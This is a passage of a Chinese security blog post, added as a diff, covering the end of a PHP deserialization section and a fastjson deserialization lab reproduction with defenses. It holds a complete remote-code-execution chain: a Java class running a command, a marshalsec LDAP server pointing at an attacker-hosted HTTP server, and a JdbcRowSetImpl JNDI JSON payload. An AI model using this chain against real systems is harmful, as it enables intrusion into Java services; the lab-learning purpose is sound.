+          <a href="#防御-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-7" class="headerlink" title="防御"></a>防御</h4>
+      <p>对反序列化前的输入数据进行严格的验证和过滤，确保数据格式和内容的合法性</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/O:\d+:&quot;[^&quot;]+&quot;:\d+:&#123;.*&#125;/&#x27;, $data))</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="fastjson反序列化"   >
+          <a href="#fastjson反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h3>
+      
+        <h4 id="原理-8"   >
+          <a href="#原理-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-8" class="headerlink" title="原理"></a>原理</h4>
+      <p>AutoType机制允许在JSON字符串中指定反序列化的具体类，从而动态地将JSON反序列化为不同类型的Java对象。可以通过构造恶意JSON字符串，指定反序列化为任意类，从而执行该类中的代码。</p>
+
+        <h4 id="靶场复现-5"   >
+          <a href="#靶场复现-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-5" class="headerlink" title="靶场复现"></a>靶场复现</h4>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071434020.png" alt="image-20240607143406933"></p>
+
+        <h6 id="编译并上传命令执行代码"   >
+          <a href="#编译并上传命令执行代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#编译并上传命令执行代码" class="headerlink" title="编译并上传命令执行代码"></a>编译并上传命令执行代码</h6>
+      <p>新建一个Touch.java文件，写入</p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Touch</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/Touch&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>然后在该文件目录下打开终端，编译，运行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Touch.java</span><br></pre></td></tr></table></div></figure>
+
+<p>此时该目录下会生成一个Touch.class文件</p>
+
+        <h6 id="启动http服务"   >
+          <a href="#启动http服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动http服务" class="headerlink" title="启动http服务"></a>启动http服务</h6>
+      <p>打开终端，运行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444   //端口号只要不被其他应用占用就行</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="使用Marshalsec来启动LDAP服务器"   >
+          <a href="#使用Marshalsec来启动LDAP服务器" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用Marshalsec来启动LDAP服务器" class="headerlink" title="使用Marshalsec来启动LDAP服务器"></a>使用Marshalsec来启动LDAP服务器</h6>
+      <p>在E:\Github\marshalsec-master\target目录下打开终端，运行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://主机ip地址:4444/#Touch&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435339.png" alt="image-20240531154409456"></p>
+
+        <h6 id="发包"   >
+          <a href="#发包" class="heading-link"><i class="fas fa-link"></i></a><a href="#发包" class="headerlink" title="发包"></a>发包</h6>
+      <p>抓包后修改为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson HTTP/1.1</span><br><span class="line">Host: 本机ip:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;100&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://本机ip:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 189</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   &quot;axin&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">      &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;is&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">      &quot;dataSourceName&quot;:&quot;ldap://本机ip:1389/Touch&quot;,</span><br><span class="line">      &quot;autoCommit&quot;:true</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>发送后会显示</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435384.png" alt="image-20240531155441657"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435363.png" alt="image-20240531155505690"></p>
+<p>查看docker文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435367.png" alt="image-20240531155609569"></p>
+
+        <h4 id="防御-8"   >
+          <a href="#防御-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-8" class="headerlink" title="防御"></a>防御</h4>
+      <p>禁用AutoType，防止通过JSON字符串指定反序列化的具体类</p>
+<p>严格控制允许反序列化的类，使用白名单机制，仅允许反序列化指定的安全类</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://pidan-007.github.io">PiDan-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://pidan-007.github.io/2024/06/07/WEB%E6%BC%8F%E6%B4%9E/">https://pidan-007.github.io/2024/06/07/WEB%E6%BC%8F%E6%B4%9E/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/07/05/lylme_spage%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">六零导航页file.php任意文件上传漏洞（CVE-2024-34982）</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2024/05/30/Vulhub/"><span class="paginator-prev__text">Vulhub-学习</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">
+          WEB漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">
+          暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">
+          攻击方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">
+          防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">
+          命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">
+          靶场复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">
+          防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.3.</span> <span class="toc-text">
+          XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">
+          分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">
+          利用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-2"><span class="toc-number">1.3.0.4.</span> <span class="toc-text">
+          防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.4.</span> <span class="toc-text">
+          CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">
+          靶场复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-3"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">
+          防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.</span> <span class="toc-text">
+          文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">
+          靶场复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.5.0.2.1.</span> <span class="toc-text">
+          本地</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B"><span class="toc-number">1.5.0.2.2.</span> <span class="toc-text">
+          远程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-4"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">
+          防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.</span> <span class="toc-text">
+          文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">
+          靶场复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-5"><span class="toc-number">1.6.0.3.</span> <span class="toc-text">
+          防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">
+          SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-6"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E7%B1%BB-1"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">
+          分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.7.0.3.</span> <span class="toc-text">
+          注入过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.0.3.1.</span> <span class="toc-text">
+          手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E7%B1%BB%E5%9E%8B%EF%BC%88%E6%95%B0%E5%AD%97%E5%9E%8Bor%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89"><span class="toc-number">1.7.0.3.1.1.</span> <span class="toc-text">
+          判断类型（数字型or字符型）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%88%97%E6%95%B0%EF%BC%88%E4%BB%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.7.0.3.1.2.</span> <span class="toc-text">
+          查看列数（以字符型为例）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%88%E4%BB%A52%E5%88%97%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.7.0.3.1.3.</span> <span class="toc-text">
+          获取数据库名（以2列为例）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">1.7.0.3.1.4.</span> <span class="toc-text">
+          获取表名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.7.0.3.1.5.</span> <span class="toc-text">
+          获取表字段名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="toc-number">1.7.0.3.1.6.</span> <span class="toc-text">
+          获取字段内容</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Sqlmap%EF%BC%88%E4%BB%A5DVWA%E9%9D%B6%E5%9C%BA%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.7.0.3.2.</span> <span class="toc-text">
+          Sqlmap（以DVWA靶场为例）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.7.0.3.2.1.</span> <span class="toc-text">
+          获取数据库名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D-1"><span class="toc-number">1.7.0.3.2.2.</span> <span class="toc-text">
+          获取表名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="toc-number">1.7.0.3.2.3.</span> <span class="toc-text">
+          获取表字段名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9-1"><span class="toc-number">1.7.0.3.2.4.</span> <span class="toc-text">
+          获取字段内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-6"><span class="toc-number">1.7.0.4.</span> <span class="toc-text">
+          防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.8.</span> <span class="toc-text">
+          反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.8.1.</span> <span class="toc-text">
+          PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-7"><span class="toc-number">1.8.1.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-4"><span class="toc-number">1.8.1.2.</span> <span class="toc-text">
+          靶场复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-7"><span class="toc-number">1.8.1.3.</span> <span class="toc-text">
+          防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.8.2.</span> <span class="toc-text">
+          fastjson反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-8"><span class="toc-number">1.8.2.1.</span> <span class="toc-text">
+          原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-5"><span class="toc-number">1.8.2.2.</span> <span class="toc-text">
+          靶场复现</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%B9%B6%E4%B8%8A%E4%BC%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.8.2.2.0.1.</span> <span class="toc-text">
+          编译并上传命令执行代码</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8http%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.8.2.2.0.2.</span> <span class="toc-text">
+          启动http服务</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Marshalsec%E6%9D%A5%E5%90%AF%E5%8A%A8LDAP%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.8.2.2.0.3.</span> <span class="toc-text">
+          使用Marshalsec来启动LDAP服务器</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%91%E5%8C%85"><span class="toc-number">1.8.2.2.0.4.</span> <span class="toc-text">
+          发包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-8"><span class="toc-number">1.8.2.3.</span> <span class="toc-text">
+          防御</span></a></li></ol></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">13</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PiDan-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
